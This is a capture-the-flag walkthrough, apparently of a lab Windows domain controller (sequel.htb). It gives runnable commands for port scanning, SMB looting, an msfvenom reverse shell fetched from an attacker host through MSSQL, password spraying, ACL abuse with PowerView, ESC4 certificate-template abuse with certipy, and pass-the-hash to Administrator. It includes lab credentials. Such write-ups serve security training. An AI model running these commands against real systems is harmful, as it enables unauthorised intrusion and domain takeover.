## Attack Path 

> TODO: Create a schema of attack path (Now i'm going to watch the Milan match)

# Enumeration

## Nmap

Check all open ports
```bash
 nmap -sS -p- -vv -min-rate 10000 -oA ./nmap/massive_scan 10.129.232.128  
```

- **min-rate 10000**: means that we send 10000 packets for second 
- **-p-**: Scan all 65,535 ports
- **-sS**: **SYN** scan is a stealth scan that check if a TCP port is open sending a SYN packet. If the target respond with `SYN-ACK` the port is open instance if respond with `RST` is closed. This scan **doesn't** complete a TCP handshake this reduce the noise and logging, this allow us to hide from **IDS** or **firewall**

Extract all ports from `.gnamp` file using `grep` and save all in **$ports** variable
```bash
ports=$(grep "Ports:" nmap/massive_scan.gnmap | grep -oP '\d+(?=/open/tcp)' | paste -sd,)
```

now i perform a more deep scan only on open ports
```bash
sudo nmap -sS -sC -p $ports 10.129.232.128 -oA ./nmap/target_scan

We have found:
- **Microsoft SQL Server 2019 RTM** on port **1433** 
- The **SMB** share port on **445**
- The domain is **sequel.htb**  the computer name is **DC01** and the FQN is **DC01.sequel.htb**. I have added this information on my hotsts file 
## Enumerate SMB folders
The organization give use the rose's credentials. We can use that to enumerate the shares.

```bash
smbmap -H DC01.sequel.htb -u rose -p 'KxEPkKe6R8su'
```

![](../../../../Assest/Pasted%20image%2020250720160721.png)

The **Accounting Department** is a non standard folder so we can check what we have here. Connect to the SMB  share withe `smbclient`
```
smbclient "//DC01.sequel.htb/Accounting Department" -U rose --password 'KxEPkKe6R8su'
```

To download all content in the folder
```bash
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
![](../../../../Assest/Pasted%20image%2020250720161945.png)
We have two Excels (disgusting) files.
![](../../../../Assest/Pasted%20image%2020250721002832.png)
I try to open this to files but seams are corrupted. Indeed the magic bytes are not the corresponded bytes of xlsx.. i ha try to modify the uncorrected byte but still not worked. So i have decide to convert the Shitexl in to CSV file.

In the `Accounts` file we have different password

# Foothold

## MSSQL
With the previously founded credential we have access to MSSQL for `sa@sequel.htb`  user
![](../../../../Assest/Pasted%20image%2020250721004055.png)
- `local-auth`: This because the user is not in the domain. Is a local user of DC01 computer.

Now my idea is to craft a meterpreter shell using `msfvenom` and download in the target machine through power-shell command. First all i need to check the arch of the target. We can do with `systeminfo` command on windows.

![](../../../../Assest/Pasted%20image%2020250721004948.png)
- with the `-X` flag we can run PS code. 

Create a meterpreter shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=667 -f exe -o meterpreter.exe
```

Now setup the listener on `msfconsole` using `multi/handler` module.

```bash
netexec mssql DC01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X "powershell -c \"mkdir C:\\TEMP; Invoke-WebRequest -Uri http://10.10.14.85:8000/meterpreter.exe -OutFile C:\\TEMP\\ciccio.exe; Start-Process C:\\TEMP\\ciccio.exe\"" --verbose
```

!TODO: explain the powershell script

![](../../../../Assest/Pasted%20image%2020250721011531.png)

Now under the  `C:\SQL2019\ExpressAdv_ENU` installation folder of MSSQL we can see the `sql-Configuration.INI` file that contains `sql_svc` user's credentials.

![](../../../../Assest/Pasted%20image%2020250721012901.png)
!TODO: How to create a users list
!TODO: spray attack with founded password (i cant log in with `sql_svc` user)
![](../../../../Assest/Pasted%20image%2020250724205831.png)


As we see during the port scanning  the `5985` port is open. This port typically is used by the [`winrm` service](https://www.speedguide.net/port.php?port=5985).  we can try to brute force our users list with the password founded in the SQL config file
```bash
netexec winrm DC01.sequel.htb -u users -p 'WqSZAF6CysDQbGb3' -d sequel --continue-on-success --verbose
```
![](../../../../Assest/Pasted%20image%2020250724210228.png)
The `ryan` user has reused the  `WqSZAF6CysDQbGb3`. We can access through `evil-winrm` on the **DC01.sequel.htb** as `ryan` user an take the first flag under the desktop.

```bash
evil-winrm -i DC01.sequel.htb -u 'SEQUEL\ryan' -p 'WqSZAF6CysDQbGb3'
```
![](../../../../Assest/Pasted%20image%2020250724210452.png)


# Lateral Movement
## Bloodhound 
```bash
bloodhound-python -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 -ns DC01.sequel.htb -c DCOnly
```

Start bloodhound GUI and import the extract data 
```bash
bloodhound
```

If we check the `First Degree Object Control` of `ryan` user we can notice that has a `WriteOver` engine over `CA_SVC` 
![](../../../../Assest/Pasted%20image%2020250724230053.png)
## PowerView - Force  Change Password
The user `ryan` has the ability to modify the owner of the user `ca_svc`.

In this step we change the the owner of  `ca_svc` with `ryan`  that we have control. Add the `ResetPassword` permission to  `ryan`  over `ca_svc` and finally we change the password of  `ca_svc`. See the steps below

First of all import the [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) script in the target machine
![](../../../../Assest/Pasted%20image%2020250726075915.png)

Change the ca_svc's `ownership` to ryan using the `Set-DomainObjectOwner` method of PowerView 
```bash
Set-DomainObjectOwner -Identity ca_svc -OwnerIdentity ryan
```

We need to add the `ResetPassword` permission to change the password. We can do it using the `Add-DomainObjectAcl` method of PowerView
```bash
Add-DomainObjectAcl -TargetIdentity ca_svc -PrincipalIdentity ryan -Rights ResetPassword
```

Create a secure string that contain the new password for the `ca_svc` user
```bash
$SexyPassword = ConvertTo-SecureString 'BusyBusy123!' -AsPlainText -Force
```

Change the password using the `Set-DomainUserPassword` method of PowerView
```bash
Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $SexyPassword
```

![](../../../../Assest/Pasted%20image%2020250726085229.png)

> [!TIP]
> If u receive this error  "*Warning: [Set-Domain User Password] Error setting password for user 'ca_svc' : Exception calling "SetPassword" with "1" argument(s):*" during the execution of `Set-DomainUserPassword` check if the new password  satisfies the password's policy

To verify that the password reset was successful 

```bash
netexec smb DC01.sequel.htb -u ca_svc -p 'BusyBusy123!'
```

![](../../../../Assest/Pasted%20image%2020250726093145.png)

# Privilege Escalation
## Vulnerable Certificates

Now that we have the control over `CA_SVC` user we are member of this two group:
- `CERT PUBLISHERS`
- `DOMAIN USERS`
![](../../../../Assest/Pasted%20image%2020250724230456.png)

We can see in the description section of this group that `Members of this group are permitted to publish certificates to the directory`
![](../../../../Assest/Pasted%20image%2020250726085925.png)

Using `certipy` tool we can enumerate the vulnerable certificate
```bash
certipy find -u 'ca_svc@sequel.htb' -p 'BusyBusy123!' -dc-ip 10.129.232.128 -vulnerable -stdout
```
![](../../../../Assest/Pasted%20image%2020250726094501.png)
The `DunderMifflinAuthentication` certificate has vulnerable to `ESC4`.
To exploit the `ESC4` we can follow this step:
1. Save the old configuration, edit the template and make it vulnerable
```bash
certipy template -u ca_svc@sequel.htb -p 'BusyBusy123!' -template 'DunderMifflinAuthentication' -dc-ip 10.129.232.128 -save-old
```
![](../../../../Assest/Pasted%20image%2020250726110400.png)

2. now if we run again the `certipy` in find mode we can see the `Full Control Principals` is changed
![](../../../../Assest/Pasted%20image%2020250726110603.png)

3. Request a template certificate with impersonate the `Administrator` 
```bash
certipy req -u 'ca_svc@sequel.htb' -p 'BusyBusy123!' -dc-ip 10.129.232.128 -target DC01.sequel.htb -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' -upn 'Administrator@sequel.htb' 
```
![](../../../../Assest/Pasted%20image%2020250726102222.png)

> [!TIP]
> If u receive this error *CERTSRV_E_SUBJECT_DNS_REQUIRED* try to do your **steps very quickly**


3.  we can use the  `administrator.pfx` file  to get a TGT and extract the administrator hash 
```bash
certipy auth -pfx administrator.pfx -domain sequel.htb
```

## Evil-Winrm Hash Pass
Finally we can pass the hash through the `evil-winrm` and spawn a **Administrator** shell
![](../../../../Assest/Pasted%20image%2020250726120138.png)
cat the **root.txt** flag under the Administrator's Desktop
